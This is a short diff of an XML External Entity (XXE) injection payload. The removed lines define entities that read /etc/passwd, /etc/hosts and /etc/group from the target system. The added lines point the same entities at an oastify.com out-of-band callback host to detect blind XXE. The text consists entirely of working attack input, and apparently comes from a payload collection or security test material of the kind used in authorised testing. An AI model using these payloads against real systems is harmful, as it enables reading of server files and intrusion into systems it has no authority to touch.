@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE p [
-<!ENTITY passwd SYSTEM "file:///etc/passwd">
-<!ENTITY hosts SYSTEM "file:///etc/hosts">
-<!ENTITY group SYSTEM "file://localhost/etc/group">
+<!ENTITY passwd SYSTEM "http://77cdnmozvobaptfbsbstxsgx3o9fxil7.oastify.com">
+<!ENTITY hosts SYSTEM "http://77cdnmozvobaptfbsbstxsgx3o9fxil7.oastify.com">
+<!ENTITY group SYSTEM "http://77cdnmozvobaptfbsbstxsgx3o9fxil7.oastify.com">
 ]> 
 
 <p>
